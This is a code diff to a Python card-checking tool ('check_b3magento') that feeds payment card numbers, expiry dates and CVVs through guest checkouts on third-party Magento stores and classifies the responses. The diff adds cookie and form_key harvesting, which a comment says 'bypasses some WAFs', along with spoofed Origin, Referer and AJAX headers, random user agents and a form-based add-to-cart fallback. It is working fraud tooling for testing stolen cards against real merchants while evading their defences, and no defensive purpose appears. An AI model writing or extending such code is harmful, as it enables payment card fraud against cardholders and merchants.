@@ -146,7 +146,26 @@ def _classify(response_text: str, http_status: int, amount: str, card_str: str) 
     return {"status": "unknown", "message": short, "amount": amount, "card": card_str}
 
 
-# -- Product discovery -------------------------------------------------------
+# -- Session warm-up (cookies + form_key) ------------------------------------
+
+def _warm_session(session: requests.Session, domain: str, ua: str) -> str:
+    """GET homepage to collect session cookies and extract form_key."""
+    try:
+        r = session.get(
+            f"https://{domain}/",
+            headers={"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*",
+                     "Accept-Language": "en-US,en;q=0.9"},
+            timeout=REQUEST_TIMEOUT,
+        )
+        # form_key in HTML
+        m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', r.text)
+        if m:
+            return m.group(1)
+        # form_key in cookie jar
+        return session.cookies.get("form_key", "")
+    except Exception:
+        return ""
+
 
 def _discover_product(session: requests.Session, domain: str, ua: str):
     """Return (product_id_str, sku_str) for a purchasable simple product, or None."""
@@ -259,10 +278,17 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
     ua       = random_ua()
     base_url = f"https://{domain}"
+
+    # 0. Warm session — collect cookies + form_key (bypasses some WAFs)
+    form_key = _warm_session(session, domain, ua)
+
     json_hdrs = {
-        "User-Agent":   ua,
-        "Accept":       "application/json",
-        "Content-Type": "application/json",
+        "User-Agent":        ua,
+        "Accept":            "application/json",
+        "Content-Type":      "application/json",
+        "X-Requested-With":  "XMLHttpRequest",
+        "Origin":            base_url,
+        "Referer":           base_url + "/checkout/cart/",
     }
 
     # 1. Create guest cart
@@ -287,19 +313,54 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
         return {"status": "unknown", "message": "Could not find product on store", "amount": "", "card": card_str}
     product_id, product_sku = product
 
-    # 3. Add to cart via REST
+    # 3. Add to cart
+    # — REST (SKU-based) when we have a real SKU; form-based fallback when SKU is empty
     atc_ok = False
-    try:
-        r = session.post(
-            f"{base_url}/rest/V1/guest-carts/{masked_id}/items",
-            json={"cartItem": {"quote_id": masked_id, "sku": product_sku, "qty": 1}},
-            headers=json_hdrs,
-            timeout=REQUEST_TIMEOUT,
-        )
-        if r.status_code in (200, 201):
-            atc_ok = True
-    except Exception as exc:
-        return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}
+    if product_sku:
+        try:
+            r = session.post(
+                f"{base_url}/rest/V1/guest-carts/{masked_id}/items",
+                json={"cartItem": {"quote_id": masked_id, "sku": product_sku, "qty": 1}},
+                headers=json_hdrs,
+                timeout=REQUEST_TIMEOUT,
+            )
+            if r.status_code in (200, 201):
+                atc_ok = True
+        except Exception as exc:
+            return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}
+
+    if not atc_ok:
+        # Form-based ATC — works with product_id, no SKU needed
+        try:
+            form_data = {"product": product_id, "qty": "1", "form_key": form_key}
+            r = session.post(
+                f"{base_url}/checkout/cart/add/",
+                data=form_data,
+                headers={
+                    "User-Agent":       ua,
+                    "Content-Type":     "application/x-www-form-urlencoded",
+                    "Referer":          f"{base_url}/",
+                    "Origin":           base_url,
+                },
+                timeout=REQUEST_TIMEOUT,
+                allow_redirects=True,
+            )
+            # Magento redirects to cart on success; response contains cart data
+            if r.status_code in (200, 302) and ("checkout/cart" in str(r.url) or "cart" in r.text.lower()):
+                atc_ok = True
+            # Fallback: check if cart now has items via REST
+            if not atc_ok:
+                ck = session.get(
+                    f"{base_url}/rest/V1/guest-carts/{masked_id}",
+                    headers={"User-Agent": ua, "Accept": "application/json"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                if ck.status_code == 200:
+                    cart_data = ck.json()
+                    if isinstance(cart_data, dict) and cart_data.get("items_count", 0) > 0:
+                        atc_ok = True
+        except Exception as exc:
+            return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}
 
     if not atc_ok:
         return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}
